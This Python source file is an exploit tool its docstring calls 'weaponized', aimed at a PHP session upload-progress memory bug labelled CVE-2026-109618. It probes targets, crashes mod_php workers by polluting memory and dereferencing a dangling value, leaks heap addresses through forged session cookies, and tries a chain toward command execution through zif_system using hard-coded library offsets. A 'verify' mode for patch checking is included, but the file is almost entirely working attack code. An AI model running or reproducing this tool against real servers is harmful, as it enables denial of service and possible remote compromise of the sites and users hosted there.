#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php2shell-attack — CVE-2026-109618 weaponized attack tool

Capability layers (weakest to strongest, each depends on the previous):
  probe   fingerprint / precondition check (version, upload_progress, OOM threshold, fatal shape)
  crash   weaponized DoS: OOM pollution + dangling zval dereference, deterministically kills the mod_php worker
  sweep   Stage-1 heap-leak layout sweep (forged zend_string with different stage1_n)
  chain   full chain attempt: leak chunk base -> leak libphp base -> forge HashTable -> zif_system
  verify  re-test the same target (to check whether a patch took effect)

Design principle: any "success" must be observable evidence (response / connection behavior / command echo / proof file),
no assumption-based verdicts; failures must print the failure layer so "did not hit" and "hit but not confirmed" stay distinguishable.
"""
from __future__ import annotations

import argparse
import json
import socket
import ssl
import struct
import sys
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit

SID = b"attacksessionid0001"
BOUNDARY_PRIME = b"S" * 17
BOUNDARY_KILL = b"BNDRY12345"


# ---------------------------------------------------------------- HTTP primitives
class Target:
    def __init__(self, url: str, timeout: float = 30.0):
        u = urlsplit(url)
        self.scheme = u.scheme or "http"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.scheme == "https" else 80)
        self.path = u.path or "/"
        if u.query:
            self.path += "?" + u.query
        self.timeout = timeout

    def connect(self) -> socket.socket:
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        if self.scheme == "https":
            ctx = ssl._create_unverified_context()
            s = ctx.wrap_socket(s, server_hostname=self.host)
        return s

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None, extra_headers: dict[str, str] | None = None) -> bytes:
        hdr = [f"POST {self.path} HTTP/1.1", f"Host: {self.host}:{self.port}"]
        hdr += [f"{k}: {v}" for k, v in (extra_headers or {}).items()]
        hdr += [
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}",
            f"Content-Length: {len(body)}",
            "Connection: close", "", "",
        ]
        s = self.connect()
        s.settimeout(timeout or self.timeout)
        try:
            s.sendall("\r\n".join(hdr).encode() + body)
        except OSError:
            pass  # crash-prone targets often die halfway through the write
        data = bytearray()
        try:
            while len(data) < read_cap:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, ConnectionResetError, OSError):
            pass
        finally:
            s.close()
        return bytes(data)

    def _raw_request(self, body: bytes, boundary: bytes, keep_alive: bool) -> bytes:
        hdr = [f"POST {self.path} HTTP/1.1", f"Host: {self.host}:{self.port}",
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}",
               f"Content-Length: {len(body)}",
               "Connection: " + ("keep-alive" if keep_alive else "close"), "", ""]
        return "\r\n".join(hdr).encode() + body

    @staticmethod
    def _read_response(s: socket.socket, cap: int) -> bytes:
        """Read one complete response: supports Content-Length and chunked; when unknown, read to EOF/timeout."""
        buf = bytearray()
        try:
            while b"\r\n\r\n" not in buf and len(buf) < cap:
                chunk = s.recv(65536)
                if not chunk:
                    return bytes(buf)
                buf += chunk
            head, _, rest = bytes(buf).partition(b"\r\n\r\n")
            want, chunked = None, False
            for line in head.split(b"\r\n"):
                low = line.lower()
                if low.startswith(b"content-length:"):
                    want = int(line.split(b":", 1)[1])
                elif low.startswith(b"transfer-encoding:") and b"chunked" in low:
                    chunked = True
            out = bytearray(head + b"\r\n\r\n")
            out += rest
            if want is not None:
                while len(out) - len(head) - 4 < want and len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
            elif chunked:
                # read until the terminating block "0\r\n\r\n"
                while b"\r\n0\r\n" not in out[-512:] and len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
                if out.endswith(b"\r\n\r\n") and b"\r\n0\r\n" not in out[-512:]:
                    pass
            else:
                while len(out) < cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    out += chunk
            return bytes(out)
        except (socket.timeout, ConnectionResetError, OSError):
            return bytes(buf)

    def post_keepalive_pair(self, first: tuple[bytes, bytes], second: tuple[bytes, bytes],
                            cap: int = 1 << 20, timeout: float = 60.0) -> tuple[bytes, bytes]:
        """Send two requests back to back on the same TCP connection (same prefork child process).

        This is the key to reliably hitting 109618: the OOM-polluted session global state belongs to the worker process,
        if A/B land on different workers, B cannot see the pollution and the attack degrades to an ordinary request.
        """
        s = self.connect()
        s.settimeout(timeout)
        try:
            s.sendall(self._raw_request(*first, keep_alive=True))
            r1 = self._read_response(s, cap)
            s.sendall(self._raw_request(*second, keep_alive=True))
            r2 = self._read_response(s, 65536)
            return r1, r2
        except (ConnectionResetError, BrokenPipeError, OSError):
            return b"", b""
        finally:
            s.close()

    def get(self, path: str | None = None, timeout: float | None = None) -> tuple[int, bytes]:
        p = path or self.path
        s = self.connect()
        s.settimeout(timeout or self.timeout)
        s.sendall(f"GET {p} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\nConnection: close\r\n\r\n".encode())
        data = bytearray()
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                data += chunk
        except (socket.timeout, OSError):
            pass
        finally:
            s.close()
        raw = bytes(data)
        try:
            code = int(raw.split(b" ", 2)[1])
        except Exception:  # noqa: BLE001
            code = 0
        return code, raw


def build_multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        disp = f'Content-Disposition: form-data; name="{p["name"]}"'
        if "filename" in p:
            disp += f'; filename="{p["filename"]}"'
        out += disp.encode() + b"\r\n"
        if "filename" in p:
            out += b"Content-Type: application/octet-stream\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_cookie(resp: bytes) -> bytes:
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:"):
            return line.split(b":", 1)[1].strip()
    return b""


def chunk_base_from_cookie(cookie: bytes) -> int:
    """Extract the heap pointer carried by the forged zend_string from Set-Cookie.

    Validate strictly so an ordinary 32-character hex PHPSESSID is not mistaken for a leak:
      - the value must not be 32 pure hex characters (that is a normal session id)
      - the first 8 bytes, decoded little-endian, must be page-aligned and fall in the 0x7f.... (user-space anon mmap) range
    """
    m = cookie.split(b"=", 1)
    if len(m) != 2:
        return 0
    val = m[1].split(b";")[0]
    if len(val) < 9:
        return 0
    if len(val) == 32 and all(c in b"0123456789abcdefABCDEF" for c in val):
        return 0
    base = int.from_bytes(val[:8], "little")
    if base % 0x1000 != 0:
        return 0
    if not (0x7F0000000000 <= base <= 0x800000000000):
        return 0
    return base


# ---------------------------------------------------------------- Attack surface
@dataclass
class Weapon:
    """Request-shape constants. Heap layout differs per PHP version; these are tuning candidates rather than truth."""
    huge_mb: int = 12
    prime_parts: int = 1001
    prime_part_size: int = 3000
    stage1_n: int = 892
    stage2_t: int = 443
    htdata: int = 0x6E0D8
    zif: int = 0x398EC0
    dtor: int = 0x4807D0
    notes: list[str] = field(default_factory=list)


class Attack:
    def __init__(self, url: str, w: Weapon, timeout: float = 30.0, verbose: bool = True):
        self.t = Target(url, timeout)
        self.w = w
        self.verbose = verbose

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, file=sys.stderr)

    # --- request shape ---
    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.w.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def prime_body(self, count: int | None = None, size: int | None = None) -> tuple[bytes, bytes]:
        """Build the pollution request. Stage-1 needs 1001 1-byte parts (matching the PoC);
        the 3000-byte shape makes the follow-up leak request crash outright at dereference time."""
        count = self.w.prime_parts if count is None else count
        size = self.w.prime_part_size if size is None else size
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * size} for i in range(count)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        return build_multipart(parts, BOUNDARY_PRIME), BOUNDARY_PRIME

    def kill_body(self) -> tuple[bytes, bytes]:
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        return build_multipart(parts, BOUNDARY_KILL), BOUNDARY_KILL

    def prime(self) -> dict:
        """Request A: blow past memory_limit so longjmp skips cleanup of the session state."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * self.w.prime_part_size}
                 for i in range(self.w.prime_parts)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        body = build_multipart(parts, BOUNDARY_PRIME)
        t0 = time.time()
        resp = self.t.post(body, BOUNDARY_PRIME, read_cap=1 << 20,
                           timeout=max(120.0, self.t.timeout))
        return {"bytes": len(body), "elapsed": round(time.time() - t0, 3),
                "code": self._code(resp), "resp_head": resp[:160].decode("latin-1", "replace")}

    def kill(self) -> dict:
        """Request B: dereference the dangling zval left by A during session init."""
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        body = build_multipart(parts, BOUNDARY_KILL)
        t0 = time.time()
        resp = self.t.post(body, BOUNDARY_KILL, read_cap=65536, timeout=20.0)
        elapsed = round(time.time() - t0, 3)
        return {"bytes": len(body), "elapsed": elapsed, "code": self._code(resp),
                "resp_head": resp[:160].decode("latin-1", "replace"),
                "empty_response": len(resp) == 0}

    @staticmethod
    def _code(resp: bytes) -> int:
        try:
            return int(resp.split(b" ", 2)[1])
        except Exception:  # noqa: BLE001
            return 0

    # --- detection ---
    def probe(self) -> dict:
        code, resp = self.t.get()
        version = ""
        for marker in (b"X-Powered-By: PHP/", b"PHP/"):
            i = resp.find(marker)
            if i >= 0 and marker == b"X-Powered-By: PHP/":
                version = resp[i + len(marker):i + len(marker) + 8].split(b"\r")[0].decode()
                break
        out = {"url": f"{self.t.scheme}://{self.t.host}:{self.t.port}{self.t.path}",
               "get_code": code, "server": "", "php_version": version,
               "set_cookie_on_small_post": None, "oom_threshold_mb": None,
               "progress_callback_reachable": None}
        for line in resp.split(b"\r\n"):
            if line.lower().startswith(b"server:"):
                out["server"] = line.split(b":", 1)[1].strip().decode("latin-1")
        # small POST: check whether Set-Cookie comes back normally (a session sink exists)
        body = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "x", "data": b"1"},
        ], BOUNDARY_KILL)
        r = self.t.post(body, BOUNDARY_KILL, read_cap=65536)
        out["set_cookie_on_small_post"] = bool(parse_cookie(r))
        out["small_post_code"] = self._code(r)
        # OOM threshold bisection: single field from 1..16MB, watch for fatal/OOM markers in the response
        lo, hi = 1, max(2, self.w.huge_mb)
        out["oom_threshold_mb"] = self._bisect_oom(lo, hi)
        out["progress_callback_reachable"] = out["set_cookie_on_small_post"]
        return out

    def _oom_probe(self, mb: int) -> bool:
        body = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
        ], BOUNDARY_KILL)
        r = self.t.post(body, BOUNDARY_KILL, read_cap=65536, timeout=60.0)
        low = r.lower()
        return (b"allowed memory size" in low or b"out of memory" in low
                or b"fatal error" in low or len(r) == 0)

    def _bisect_oom(self, lo: int, hi: int) -> int | None:
        if not self._oom_probe(hi):
            return None
        while lo < hi:
            mid = (lo + hi) // 2
            if self._oom_probe(mid):
                hi = mid
            else:
                lo = mid + 1
        return lo

    def _control_pair_ok(self) -> bool:
        """Control group: two harmless small POSTs on one connection; does the second get a response?

        Used to rule out a server that closes keep-alive (empty response) being misread as a worker crash.
        """
        harmless = build_multipart([
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "x", "data": b"1"},
        ], BOUNDARY_KILL)
        _, r2 = self.t.post_keepalive_pair((harmless, BOUNDARY_KILL), (harmless, BOUNDARY_KILL),
                                           cap=65536, timeout=20.0)
        return len(r2) > 0

    def crash_test(self, rounds: int = 2) -> dict:
        """Deterministically kill the worker: A(pollution) -> B(dereference) on one keep-alive connection.

        The verdict requires all three conditions, to avoid false positives:
          1) the control group's second request on the same connection gets a response (keep-alive works)
          2) the attack group's second request gets no response/500 (the process dies at dereference)
          3) a plain GET still works afterwards (the master respawned the worker, so the child crashed, not the service)
        """
        control_ok = self._control_pair_ok()
        evidence = []
        killed = 0
        body_a, bnd_a = self.prime_body()
        body_b, bnd_b = self.kill_body()
        for i in range(rounds):
            before = self.t.get(timeout=10.0)[0]
            t0 = time.time()
            r1, r2 = self.t.post_keepalive_pair((body_a, bnd_a), (body_b, bnd_b),
                                                cap=1 << 20, timeout=120.0)
            elapsed = round(time.time() - t0, 3)
            time.sleep(0.4)
            after = self.t.get(timeout=10.0)[0]
            alive = after in (200, 301, 302, 403, 404)
            crashed = len(r2) == 0 or self._code(r2) in (0, 500)
            evidence.append({
                "round": i + 1,
                "prime": {"bytes": len(body_a), "code": self._code(r1),
                          "resp_head": r1[:120].decode("latin-1", "replace")},
                "kill": {"bytes": len(body_b), "code": self._code(r2), "empty": len(r2) == 0,
                         "resp_head": r2[:120].decode("latin-1", "replace")},
                "elapsed": elapsed, "alive_before": before, "alive_after": after,
                "worker_respawned": alive,
                "verdict_crash": bool(control_ok and crashed and alive),
            })
            if control_ok and crashed and alive:
                killed += 1
        verdict = "worker_killed" if killed else ("inconclusive_keepalive" if not control_ok else "no_crash")
        return {"rounds": rounds, "crashes": killed, "control_keepalive": control_ok,
                "verdict": verdict, "evidence": evidence}

    def leak_sweep(self, ns: list[int], same_conn: bool = True) -> dict:
        """Stage-1 sweep: forge the zend_string length so Set-Cookie carries out a heap address.

        With same_conn=True the pollution and leak requests share one keep-alive connection,
        guaranteeing the same prefork child process (cross-process attacks degrade to ordinary requests).
        """
        results = []
        pb, pbnd = self.prime_body(count=1001, size=1)
        for n in ns:
            if not same_conn:
                self.prime()
            parts = [
                {"name": "PHPSESSID", "data": SID},
                {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            ]
            for i in range(n):
                parts.append({"name": str(1000 + i),
                              "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
            forge = bytearray(b"A" * 79)
            struct.pack_into("<Q", forge, 0x10, 0x1000)  # forge zend_string->len
            forge[0x18] = ord("L")
            parts.append({"name": "1999", "data": bytes(forge)})
            lb = build_multipart(parts, b"B" * 10)
            if same_conn:
                _, resp = self.t.post_keepalive_pair((pb, pbnd), (lb, b"B" * 10),
                                                     cap=9 << 20, timeout=120.0)
            else:
                resp = self.t.post(lb, b"B" * 10, read_cap=9 << 20)
            cookie = parse_cookie(resp)
            base = chunk_base_from_cookie(cookie)
            results.append({"stage1_n": n, "code": self._code(resp),
                            "cookie": cookie[:80].decode("latin-1", "replace"),
                            "chunk_base": hex(base) if base else None})
        hit = [r for r in results if r["chunk_base"]]
        return {"tried": len(results), "leaks": len(hit), "results": results,
                "verdict": "heap_leaked" if hit else "no_leak"}

    def chain(self, ns: list[int]) -> dict:
        """Full chain: leak -> libphp base -> forged HashTable -> zif_system."""
        leak = self.leak_sweep(ns)
        if not leak["leaks"]:
            return {"stage_reached": "prime+crash", "rce": False, "leak": leak,
                    "reason": "Stage-1 did not obtain the heap base, so Stage-2/3 have no foundation;"
                              "this configuration only yields a reliable crash primitive (DoS)."}
        base = int(leak["results"][-1]["chunk_base"], 16)
        # Stage-2: leak the libphp base with a 56-byte HashTable page (shape follows the PoC)
        self.prime()
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart(parts, BOUNDARY_PRIME), BOUNDARY_PRIME, read_cap=1 << 20,
                    timeout=120.0)
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            cnt = 16 if i == self.w.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x"})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        cookie = parse_cookie(resp)
        low = 0
        if cookie:
            val = cookie.split(b"=", 1)[-1].split(b";")[0]
            if len(val) >= 8:
                low = int.from_bytes(val[:8], "little") & 0xFFF
        return {"stage_reached": "stage2_attempt", "rce": False, "chunk_base": hex(base),
                "stage2_cookie": cookie[:80].decode("latin-1", "replace"),
                "stage2_low12": hex(low), "expected_low12": hex(self.w.dtor & 0xFFF),
                "reason": "Stage-2 libphp base not aligned to the zval_ptr_dtor page offset" if low != (self.w.dtor & 0xFFF) else
                          "base likely hit, but the Stage-3 forged payload still needs tuning for this version's layout"}


# ---------------------------------------------------------------- CLI
def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-109618 attack tool (authorized labs only)")
    ap.add_argument("action", choices=["probe", "crash", "sweep", "chain", "verify"])
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--rounds", type=int, default=2)
    ap.add_argument("--ns", default="100,300,500,700,892,1100,1300,1600")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("--prime-parts", type=int, default=1001)
    ap.add_argument("--prime-size", type=int, default=3000)
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=0x398EC0)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=0x4807D0)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=0x6E0D8)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    a = ap.parse_args()

    w = Weapon(huge_mb=a.huge_mb, prime_parts=a.prime_parts, prime_part_size=a.prime_size,
               zif=a.zif_offset, dtor=a.dtor_offset, htdata=a.htdata_offset)
    atk = Attack(a.url, w, timeout=a.timeout, verbose=not a.json)

    if a.action == "probe":
        out = atk.probe()
    elif a.action in ("crash", "verify"):
        out = atk.crash_test(rounds=a.rounds)
        if a.action == "verify":
            if out["crashes"] > 0:
                out["patch_verdict"] = "still_vulnerable"
            elif out["verdict"] == "inconclusive_keepalive":
                out["patch_verdict"] = "inconclusive"
            else:
                out["patch_verdict"] = "patched_or_mitigated"
    elif a.action == "sweep":
        out = atk.leak_sweep([int(x) for x in a.ns.split(",") if x.strip()])
    else:
        out = atk.chain([int(x) for x in a.ns.split(",") if x.strip()])

    print(json.dumps(out, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    sys.exit(main())
